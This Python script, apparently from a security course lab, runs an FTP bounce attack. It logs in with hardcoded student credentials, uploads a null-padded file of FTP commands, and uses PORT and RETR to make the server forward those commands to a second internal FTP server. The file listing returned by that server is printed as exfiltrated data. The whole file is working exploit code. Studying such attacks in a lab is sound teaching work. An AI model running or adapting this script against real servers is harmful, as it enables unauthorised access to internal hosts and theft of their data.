import sys, os
sys.path.append(os.path.dirname(os.path.abspath(__file__)) + "/..")
from cp_ftp import FTP

ftp = FTP("192.168.56.101", debug=True)
ftp.send_login_commands("student", "golyeeHug6")

# Build a script to get a LIST of files on the private server.

# 1. Commands to log in.
login_commands = ftp.get_login_commands("student", "golyeeHug6")

# 2. A PORT command for how to get data back to this script from the private server.
exfiltration_data_address = ftp.new_data_address()
port_command = ftp.get_port_command(exfiltration_data_address)

# 3. Build up the list of commands.
exploit_commands = []
exploit_commands.append(login_commands)
exploit_commands.append(port_command)
exploit_commands.append("LIST")
exploit_commands.append("QUIT")

# 4. Put the commands together. Pad with 1M nullbytes to ensure socket stays open long enough.
exploit_file = "exploit.txt"
file_contents = "\r\n".join(exploit_commands) + "\0" * 1000000

# Upload the script to the server.

# 1. Set the PORT to send data upon.
data_address = ftp.new_data_address()
ftp.send_port_command(data_address)
response = ftp.recv_response()
if response.code != 200:
  print(response)
  sys.exit(1)

# 2. Command to upload the exploit commands to a file.
ftp.send_command("STOR %s" % exploit_file)
response = ftp.recv_response()
if response.code != 150:
  print(response)
  sys.exit(1)

# 3. Send the exploit commands along the data connection.
ftp.send_data(file_contents)
response = ftp.recv_response()
if response.code != 226:
  print(response)
  sys.exit(1)

# Have the server send the script to the private server.

# 1. Tell server it can open Data Connection to private server's FTP Command port.
target_address = ("192.168.56.103", 21)
ftp.send_port_command(target_address)
response = ftp.recv_response()
if response.code != 200:
  print(response)
  sys.exit(1)

# 2. Tell server to open data and connection and send exploit commands to private server.
ftp.send_command("RETR %s" % exploit_file)
response = ftp.recv_response()
if response.code != 150:
  print(response)
  sys.exit(1)

# 3. Rebind to the exfilitration port chosen earlier and read LIST of private files from it.
ftp.new_data_address(port=exfiltration_data_address[1])
print("********* [EXFILTRATED DATA BEGINS] *********")
ftp.recv_data()
print("********* [EXFILTRATED DATA ENDS] *********")

# 4. Final success/failure mode for sending exploit commands to private server.
response = ftp.recv_response()
if response.code != 226:
  print(response)
  sys.exit(1)

ftp.close()
